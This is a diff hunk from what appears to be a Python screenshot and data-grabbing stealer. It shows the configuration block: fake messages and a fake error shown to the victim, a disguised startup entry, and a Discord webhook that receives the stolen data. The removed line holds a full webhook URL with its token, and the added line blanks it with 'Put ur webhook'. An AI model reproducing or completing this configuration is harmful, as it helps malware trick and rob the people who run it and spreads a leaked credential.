@@ -22,7 +22,7 @@ from PIL import ImageGrab
 ### CONFIG ### 
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 fakeerror = True # If True it will make an fake error message at the end
-webhook = 'https://discord.com/api/webhooks/1101543501818241147/6_bZynYH6pmIomJN2tiVsDFXFndJoiMLwCO0Ixhu2a9aAThKqRQOUh-WirRZYNH8DawP' #Put ur webhook
+webhook = '' #Put ur webhook
 Startup = 'Dont mind this'
 
 if shitty_message == True:
